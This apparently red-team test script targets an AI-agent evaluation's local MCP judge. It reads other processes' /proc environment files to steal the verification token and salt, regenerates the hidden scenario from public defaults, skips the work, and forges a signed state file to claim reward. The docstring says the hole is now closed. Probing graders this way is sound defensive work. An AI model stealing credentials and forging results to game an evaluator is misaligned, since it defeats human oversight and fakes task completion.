"""Attack the README's local judge path: `VERIFY_TOKEN=judge-local SLEEPER_SEED=1000 make mcp`.

The attacker is a local agent running as the same OS user as the judge (as OpenCode does on a laptop).
Start the server first: VERIFY_TOKEN=judge-local SLEEPER_SEED=1000 make mcp MCP_PORT=8010 MCP_REWARD_PORT=8011
Then, as the same OS user: python -m redteam.vaishnav_local_mcp [--forge]. Reward 1 with --forge was the hole; it is 0 now.
"""
import asyncio, glob, json, os, sys, urllib.request

from mcp import ClientSession
from mcp.client.streamable_http import streamable_http_client

SEAT, SEED, PUBLIC_SALT = "finance_ap", 1000, "judge-local-salt"   # Makefile default salt
STATE = "/tmp/sleeper-mcp-state.json"
forge = "--forge" in sys.argv

# 1. /proc scan: who carries the secrets in its environment?
leaks = {}
for p in glob.glob("/proc/[0-9]*/environ"):
    try:
        env = open(p, "rb").read().split(b"\0")
    except OSError:
        continue
    hit = [e.split(b"=")[0].decode() for e in env if e.split(b"=")[0] in (b"VERIFY_TOKEN", b"SLEEPER_SALT", b"SLEEPER_SEED")]
    if hit:
        pid = p.split("/")[2]
        cmd = open(f"/proc/{pid}/cmdline", "rb").read().replace(b"\0", b" ")[:60].decode(errors="replace")
        leaks[pid] = (hit, cmd)
token = None
for pid, (hit, cmd) in leaks.items():
    print(f"/proc/{pid}/environ has {hit}  ({cmd})")
    if "VERIFY_TOKEN" in hit and token is None:
        env = dict(e.split(b"=", 1) for e in open(f"/proc/{pid}/environ", "rb").read().split(b"\0") if b"=" in e)
        token = env[b"VERIFY_TOKEN"].decode()
print("token from /proc:", "found" if token else "none")

# 2. Rebuild the server's day from public values only.
from harbor.sidecar import effective_id
from sleeper.secrets import scoped_secrets
from lab.run import day_for, build_team
day_id = effective_id(SEED, SEAT, salt=PUBLIC_SALT)
with scoped_secrets(SLEEPER_SALT=PUBLIC_SALT):
    day, strategy, _, _ = day_for(day_id, SEAT)
mine = sorted(t.id for t in day.tickets if t.seat == SEAT)
print(f"public generator: sleeper seat = {day.sleeper_seat}, goal = {getattr(day.goal, 'kind', None)}, my tickets = {mine}")

async def play():
    async with streamable_http_client("http://127.0.0.1:8010/mcp") as (r, w):
        async with ClientSession(r, w) as s:
            await s.initialize()
            res = await s.call_tool("my_tickets", {})
            got = json.loads(res.content[0].text)
            ids = sorted(t["id"] for t in (got.get("tickets") or got.get("result") or []) if isinstance(t, dict) and "id" in t) if isinstance(got, dict) else got
            print("server my_tickets ids:", ids, "| same as public generator:", ids == mine)
            for _ in range(400):   # stop early: end the day without working
                res = await s.call_tool("end_turn", {})
                if "day over" in res.content[0].text:
                    break
asyncio.run(play())

# 3. Forge: replace the finished state with an oracle-played day signed with the leaked/public token.
if forge:
    import random, inspect
    from sleeper.day import run_day
    from sleeper.verifier import dump_state, sign
    from agents.sleeper_agent import SleeperAgent
    with scoped_secrets(SLEEPER_SALT=PUBLIC_SALT):
        day, strategy, _, _ = day_for(day_id, SEAT)
        players = build_team("oracle", day, 0)
        if day.sleeper_seat and strategy:
            kw = {"ticks": day.ticks} if "ticks" in inspect.signature(SleeperAgent).parameters else {}
            players[day.sleeper_seat] = SleeperAgent(day.sleeper_seat, day.goal, strategy, random.Random(day_id), **kw)
        world = run_day(day, players)
    st = sign(dump_state(world), token or "judge-local")
    open(STATE, "w").write(json.dumps(st))
    print("forged state written to", STATE)

# 4. The judge's reward call.
req = urllib.request.Request("http://127.0.0.1:8011/reward", headers={"X-Verify-Token": token or "judge-local"})
d = json.loads(urllib.request.urlopen(req, timeout=120).read())
print("REWARD:", d.get("reward"), "harm:", d.get("harm"))
